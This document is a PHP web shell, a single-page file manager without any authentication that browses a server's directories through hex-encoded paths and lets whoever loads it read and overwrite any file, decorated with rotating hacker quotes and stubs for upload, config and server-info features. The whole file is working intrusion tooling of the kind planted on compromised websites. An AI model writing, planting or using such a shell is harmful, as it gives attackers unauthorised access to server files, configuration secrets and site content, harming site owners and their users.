<meta name="viewport" content="width=device-width,height=device-height initial-scale=1">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flexboxgrid/6.3.1/flexboxgrid.min.css" type="text/css" >
<style type="text/css">
	@import url('https://fonts.googleapis.com/css2?family=MuseoModerno&display=swap');
	:root {
		--color-bg:#f2f2f2;
	}
	body {
		font-family: 'MuseoModerno', cursive;
		overflow: hidden;
		margin:10px;
	}
	a {
		text-decoration: none;
		color: #000;
	}
	div.container {
		margin:15px;
		width:80%;
		text-align:left;
	}
	div.header {
		border-radius:5px 5px 0px 0px;
		width:100%;
		background: var(--color-bg);
		padding-top:15px;
		padding-bottom:15px;
		border-top: 1px solid #e6e6e6;
		border-left: 1px solid #e6e6e6;
		border-right: 1px solid #e6e6e6;
	}
	span.home {
		margin-left: 15px;
	}
	div.center {
		overflow: auto;
		max-height:580px;
		border-radius:0px 0px 5px 0px;
		padding:10px;
		border-top: 1px solid #e6e6e6;
		border-right: 1px solid #e6e6e6;
		border-bottom: 1px solid #e6e6e6;
	}
	div.tool {
		border-radius:0px 0px 0px 5px;
		width:100%;
		padding:15px;
		border: 1px solid #e6e6e6;
	}
	div.tool a {
		background:#f2f2f2;
		border: 1px solid #e6e6e6;
		display: block;
		margin:10px;
		border-radius:5px;
		padding: 7px;
	}
	div.dir, div.file {
		padding:1px;

	}
	div.info {
		display: inline-block;
		width:100px;
		padding:3px;
		float: right;
		text-align: center;
	}
	select {
		background:#f2f2f2;
		border-radius:4px;
		border: 1px solid #e6e6e6;
		outline: none;
		font-family: 'MuseoModerno', cursive;
		width:100%;
	}
	div.edit {
		padding:10px;
	}
	textarea {
		border: 1px solid #e6e6e6;
		outline: none;
		padding:20px;
		width: 100%;
		height:300px;
		border-radius:5px;
	}
	td.action {
		text-align: center;
		font-size:25px;
	}
	input[type=submit] {
		font-family: 'MuseoModerno', cursive;
		width:100%;
		border-radius:5px;
		background:#f2f2f2;
		border: 1px solid #e6e6e6;
		padding:7px;
	}
	.icons {
		margin-top:5px;
        width:24px;
        height:24px;
    }
    div.quotes {
    	border-left: 1px solid #e6e6e6;
    	border-right: 1px solid #e6e6e6;
    }
	.filename, .textarea, .submit {
		padding:3px;
	}
	::-webkit-scrollbar {
  		width: 0px;
	}
	::-webkit-scrollbar-track {
  		background: none;
	}
	::-webkit-scrollbar-thumb {
  		background:none;
	}
	::-webkit-scrollbar-thumb:hover {
  		background: none; 
	}
	td.img {
		width:30px;
	}
	td.act {
		width:10%;
	}
	textarea::placeholder {
		color: red;
		opacity: 1;
	}
	textarea:-ms-input-placeholder {
  		color: red;
	}
	textarea::-ms-input-placeholder {
  		color: red;
	}
	.marquee {
  		height: 25px;
  		width: 100%;
  		overflow: hidden;
 		position: relative;
	}
	.marquee div {
		text-align: center;
  		display: block;
  		width: 100%;
  		height: 30px;
  		position: absolute;
  		overflow: hidden;
	}
	.second {
		display: none;
	}
	.marquee span {
  		width: 50%;
	}
	@keyframes marquee {
		0% {
			left: 0; 
		}
		100% { 
			left: -100%; 
		}
	}
	@media (min-width: 320px) and (max-width: 480px) {
		div.container {
			margin: 0;
			width:121%;
		}
		div.tool, .size, .perms {
			display: none;
		}
		td.act {
			width:13%;

		}
		.marquee div {
			animation: marquee 5s linear infinite;
		}
		.second {
			display: inline;
		}
		select {
  			-moz-appearance: none;
  			-webkit-appearance: none;
  			padding: 2px 2px;
		}
		div.center {
			height:420px;
		}
	}
</style>
<center>
<div class="container">
	<div class="row">
		<div class="header">
			<span class="home">
				<a href="?">HOME</a>
			</span>
		</div>
	</div>
	<?php
	class x {
		public static $cwd;
		public static $angka;
		public static $handle;
		public static $extension;
		public static function cwd() {
			return str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
		}
		public static function cd($directory) {
			return chdir($directory);
		}
		public static function files($type) {
			$result = array();
			foreach (scandir(self::cwd()) as $key => $value) {
				$file['name'] = self::cwd() . DIRECTORY_SEPARATOR . $value;
				switch ($type) {
					case 'dir':
						if (!is_dir($file['name']) || $value === '.') continue 2;
						break;
					case 'file':
						if (!is_file($file['name'])) continue 2;
						break;
				}
				$file['link']	= self::hex($file['name']);
				$file['size'] 	= (is_dir($file['name'])) ? @filetype($file['name']) : x::size($file['name']);
				$file['perms'] 	= x::w__($file['name'], x::perms($file['name'])); 
				$result[] = $file;
			} return $result;
		}
		public static function save($filename = null, $data, $type) {
			switch ($type) {
				case 'save':
					self::$handle = fopen($filename, "w");
					fwrite(self::$handle, $data);
					fclose(self::$handle);
					break;
				case 'makefile':
					self::$handle = fopen($filename, "w");
					fwrite(self::$handle, $data);
					fclose(self::$handle);
					break;
			}
		}
		public static function perms($filename) {
			return substr(sprintf("%o", fileperms($filename)), -4);
		}
		public static function w__($filename, $perms) {
        	if (is_writable($filename)) {
            	return "<font color='green'>{$perms}</font>";
        	} else {
            	return "<font color='red'>{$perms}</font>";
        	}
    	}
    	public static function getimg($filename) {
        	self::$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        	switch (self::$extension) {
            	case 'php':
                	print("https://image.flaticon.com/icons/png/128/337/337947.png");
                	break;
            	default:
                	print("https://image.flaticon.com/icons/svg/833/833524.svg");
                	break;
        	}
    	}
    	public static function quotes(){
    		$quotes = array(
    			"<font size='2'>&quot;When solving problems, dig at the roots instead of just hacking at the leaves&quot;</font>  <font size='1' color='gray'>Anthony J. D'Angelo</font>",
    			"<font size='2'>&quot;The difference between stupidity and genius is that genius has its limits&quot;</font>  <font size='1' color='gray'>Albert Einstein</font>",
    			"<font size='2'>&quot;As a young boy, I was taught in high school that hacking was cool.&quot;</font>  <font size='1' color='gray'>Kevin Mitnick</font>",
    			"<font size='2'>&quot;A lot of hacking is playing with other people, you know, getting them to do strange things.&quot;</font>  <font size='1' color='gray'>Steve Wozniak</font>",
    			"<font size='2'>&quot;If you give a hacker a new toy, the first thing he'll do is take it apart to figure out how it works.&quot;</font>  <font size='1' color='gray'>Jamie Zawinski</font>",
    			"<font size='2'>&quot;Software Engineering might be science; but that's not what I do. I'm a hacker, not an engineer.&quot;</font>  <font size='1' color='gray'>Jamie Zawinski</font>",
    			"<font size='2'>&quot;Never underestimate the determination of a kid who is time-rich and cash-poor&quot;</font>  <font size='1' color='gray'>Cory Doctorow</font>",
    			"<font size='2'>&quot;It? hardware that makes a machine fast. It? software that makes a fast machine slow.&quot;</font>  <font size='1' color='gray'>Craig Bruce</font>",
    			"<font size='2'>&quot;The function of good software is to make the complex appear to be simple.&quot;</font>  <font size='1' color='gray'>Grady Booch</font>",
    			"<font size='2'>&quot;Pasting code from the Internet into production code is like chewing gum found in the street.&quot;</font>  <font size='1' color='gray'>Anonymous</font>",
    			"<font size='2'>&quot;Tell me what you need and I'll tell you how to get along without it.&quot;</font>  <font size='1' color='gray'>Anonymous</font>",
    			"<font size='2'>&quot;Hmm..&quot;</font> <font size='1' color='gray'>Smash</font>",
    			"<font size='2'>&quot;Once we accept our limits, we go beyond them.&quot;</font> <font size='1' color='gray'>Albert Einstein</font>",
    			"<font size='2'>&quot;Listen to many, speak to a few.&quot;</font> <font size='1' color='gray'>William Shakespeare</font>",
    			"<font size='2'>&quot;The robbed that smiles, steals something from the thief.&quot;</font> <font size='1' color='gray'>William Shakespeare</font>");
    		$quote = $quotes[array_rand($quotes)];
    		return $quote;
		}
    	public static function hex($string){
    		$hex = '';
    		for ($i=0; $i < strlen($string); $i++) {
    			$hex .= dechex(ord($string[$i]));
    		} return $hex;
    	}
		public static function unhex($hex){
			$string = '';
			for ($i=0; $i < strlen($hex)-1; $i+=2) {
				$string .= chr(hexdec($hex[$i].$hex[$i+1]));
			} return $string;
		}
    	public static function ftime($filename) {
        	return date("F d Y g:i:s", filemtime($filename));
    	}
    	public static function sortname($filename) {
    		if ($filename > 28) {
    			return substr(htmlspecialchars($filename), 0, 28).'...';
    		} else {
    			return $filename;
    		}
    	}
    	public static function size($filename) {
        	if (is_file($filename)) {
            	$filepath = $filename;
            	if (!realpath($filepath)) {
                	$filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
            	}
            	$filesize = filesize($filepath);
            	$array = array("TB","GB","MB","KB","B");
            	$total = count($array);
            	while ($total-- && $filesize > 1024) {
                	$filesize /= 1024;
            	} return round($filesize, 2) . " " . $array[$total];
        	} return false;
    	}
	}
	$_POST['file'] = (isset($_POST['file'])) ? x::unhex($_POST['file']) : false;
	?>
	<div class="row">
		<div class="col-xs-12 quotes">
			<div class="marquee">
				<div>
					<span><?= x::quotes() ?></span>
					<span class="second"><?= x::quotes() ?></span>
				</div>
			</div>
		</div>
		<div class="col-xs-2 tool">
			<a href="#">Server Info</a>
			<a href="#">Config</a>
			<a href="#">Upload</a>
			<a href="#">Create FIle</a>
			<a href="#">Replace File</a>
		</div>
		<div class="col-xs-10 center">
			<?php
			switch (@$_POST['action']) {
				case 'edit':
					if (isset($_POST['edit'])) {
						if (x::save($_POST['file'], $_POST['data'], 'save')) {
							print("failed");
						} else {
							print("success");
						}
					}
					?>
					<form method="post">
						<div class="edit">
							<table width='100%'>
								<tr>
									<td>
										<a href="?cd=<?= $_GET['cd'] ?>">
											<img class="icons" src="https://mlisi.xyz/img/shademe.png">
										</a>
									</td>
									<td class="action" colspan="2">EDIT</td>
								</tr>
								<tr>
									<td style="width:120px;">
										Filename
									</td>
									<td>:</td>
									<td>
										<?= x::w__($_POST['file'], basename($_POST['file'])) ?>
									</td>
								</tr>
								<tr>
									<td style="width:120px;">
										Size
									</td>
									<td>:</td>
									<td>
										<?= filesize($_POST['file']) ?>
									</td>
								</tr>
								<tr>
									<td style="width:120px;">
										Last Modif
									</td>
									<td>:</td>
									<td>
										<?= x::ftime($_POST['file']) ?>
									</td>
								</tr>
								<tr>
									<td colspan="3">
										<textarea name="data" placeholder="not writable"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
									</td>
								</tr>
								<tr>
									<td colspan="3">
										<input type="submit" name="edit" value="SAVE">
										<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
										<input type="hidden" name="action" value="edit">
									</td>
								</tr>
							</table>
						</div>
					</form>
					<?php
					exit();
					break;
				}
				if (isset($_GET['cd'])) {
					x::cd(x::unhex($_GET['cd']));
				}
				?> <table width="100%"> <?php
				foreach (x::files('dir') as $key => $dir) { ?>
					<form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
						<tr>
							<td class="img">
								<img class="icons" src="https://image.flaticon.com/icons/svg/716/716784.svg">
							</td>
							<td>
								<a href="?cd=<?= $dir['link'] ?>"><?= basename($dir['name']) ?></a>
							</td>
							<td class="size">
								<?= $dir['size'] ?>
							</td>
							<td class="perms">
								<?= $dir['perms'] ?>
							</td>
							<td class="act">
								<select name="action" onchange="if(this.value != '0') this.form.submit()">
									<option selected disabled>action</option>
								</select>
								<input type="hidden" name="file" value="<?= x::hex($dir['name']) ?>">
							</td>
						</tr>
					</form>
				<?php }
				foreach (x::files('file') as $key => $file) { ?>
					<form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
						<tr>
							<td>
								<img class="icons" src="<?= x::getimg($file['name']) ?>">
							</td>
							<td>
								<span title="<?= basename($file['name']) ?>">
									<?= x::sortname(basename($file['name'])) ?>
								</span>
							</td>
							<td class="size">
								<?= $file['size'] ?>
							</td>
							<td class="perms">
								<?= $file['perms'] ?>
							</td>
							<td>
								<select name="action" onchange="if(this.value != '0') this.form.submit()">
									<option selected disabled>action</option>
									<option value="edit">edit</option>
							</select>
							<input type="hidden" name="file" value="<?= x::hex($file['name']) ?>">
							</td>
						</tr>
					</form>
				<?php }
				?>
			</table>
		</div>
	</div>
</div>
</center>
